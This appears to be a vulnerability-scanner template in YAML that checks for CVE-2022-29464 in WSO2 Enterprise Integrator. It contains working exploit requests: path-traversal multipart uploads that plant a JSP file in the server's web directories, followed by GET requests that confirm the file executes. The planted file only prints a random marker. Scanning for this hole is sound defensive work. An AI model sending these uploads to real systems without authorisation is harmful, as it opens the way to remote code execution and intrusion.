name: yaml-poc-wso2-enterprise_integrator-directory_traversal-CVE-2022-29464
binding: 38715669-da53-4d43-8620-97159e949be4
detail:
    author: system_user
    links:
        - http://packetstormsecurity.com/files/166921/WSO-Arbitrary-File-Upload-Remote-Code-Execution.html
        - http://www.openwall.com/lists/oss-security/2022/04/22/7
        - https://cxsecurity.com/cveshow/CVE-2022-29464/
        - https://docs.wso2.com/display/Security/Security+Advisory+WSO2-2021-1738
        - https://github.com/hakivvi/CVE-2022-29464
        - https://nvd.nist.gov/vuln/detail/CVE-2022-29464
        - https://packetstormsecurity.com/files/166921/WSO-Arbitrary-File-Upload-Remote-Code-Execution.html
        - https://security.docs.wso2.com/en/latest/security-announcements/security-advisories/2022/WSO2-2021-1738/
    vulnerability:
        id: 46d9b61a-139e-4893-b046-790d10ed0253
        level: critical
    warning: File Upload
transport: http
set:
    filename: randomLowercase(7)
    randstr: randomLowercase(40)
rules:
    r0:
        request:
            cache: true
            method: POST
            path: /fileupload/toolsAny
            headers:
                Content-Type: multipart/form-data; boundary=---------------------------250033711231076532771336998311
                Upgrade-Insecure-Requests: "1"
                urn: uploadFiles
            body: "-----------------------------250033711231076532771336998311\r\nContent-Disposition: form-data; name=\"../../../../repository/deployment/server/jaggeryapps/publisher/{{filename}}.jsp\";filename=\"{{filename}}.jsp\"\r\n\r\n\n<% out.print(\"{{randstr}}\"); %>\r\n-----------------------------250033711231076532771336998311-- "
        expression: response.status == 200
    r1:
        request:
            cache: true
            method: POST
            path: /fileupload/toolsAny
            headers:
                Content-Type: multipart/form-data; boundary=---------------------------250033711231076532771336998311
                Upgrade-Insecure-Requests: "1"
                urn: uploadFiles
            body: "-----------------------------250033711231076532771336998311\r\nContent-Disposition: form-data; name=\"../../../../repository/deployment/server/webapps/authenticationendpoint/{{filename}}.jsp\";filename=\"{{filename}}.jsp\"\r\n\r\n\n<% out.print(\"{{randstr}}\"); %>\r\n-----------------------------250033711231076532771336998311-- "
        expression: response.status == 200
    r2:
        request:
            cache: true
            method: GET
            path: /publisher/{{filename}}.jsp
        expression: response.status == 200 && response.body.bcontains(bytes(randstr))
    r3:
        request:
            cache: true
            method: GET
            path: /authenticationendpoint/{{filename}}.jsp
        expression: response.status == 200 && response.body.bcontains(bytes(randstr))
expression: r0() && r2() || r1() && r3()
